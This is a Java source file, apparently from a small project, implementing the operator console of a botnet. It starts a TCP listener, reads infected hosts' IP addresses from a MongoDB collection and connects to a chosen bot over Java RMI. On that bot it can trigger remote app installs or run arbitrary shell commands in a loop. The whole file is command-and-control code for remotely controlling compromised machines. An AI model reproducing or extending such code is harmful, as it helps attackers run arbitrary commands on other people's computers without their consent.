/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import model.IBotnet;
import DBUtils.MongoConnect;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author ann52
 */

public class RMIServer {
    
    public static void main(String[] args) {
        try {
            TCPServer tcpServer = new TCPServer(2345);
            tcpServer.start();
            System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
            MongoConnect client = new MongoConnect();
            client.Connect();
            Scanner scanner = new Scanner(System.in);
            while (true){
                ArrayList<String> list = client.Read("bot_ip");
                System.out.println("Available IP:");
                for (int i = 0; i<list.size(); i++){
                    System.out.println((i+1) + ": " + list.get(i));
                }
                System.out.print("Run or refresh: ");
                String run = scanner.nextLine();
                if (run.equals("refresh")){
                    continue ;
                }
                
                System.out.print("Select IP to control: ");
                String id = scanner.nextLine();
                String ip = list.get(Integer.parseInt(id) - 1);
                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
                botnet.testing();
                
                System.out.println(">>Install app type: install");
                System.out.println(">>Run command type: exec");
                String install = scanner.nextLine();
                
                if(install.equals("install")){
                    System.out.println(">Install app/tools, pls wait 5-10 minutes!");
                    ArrayList<String> arrInstall = botnet.installApp();
                    arrInstall.forEach((i) -> {
                        System.out.println(i);
                    });
                    System.out.println("Completed");
                }
                else if(install.equals("exec")){
                    while(true){
                        System.out.print("Enter cmd: ");
                        String cmd = scanner.nextLine();
                        if(!cmd.equals("exit")){
                            ArrayList<String> arr = botnet.runCommand(cmd);
                            arr.forEach((i) -> {
                                System.out.println(i);
                            });
                        }
                        else{
                            break;
                        }
                    }
                }
            }
            
        } catch (NotBoundException | MalformedURLException | RemoteException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
}
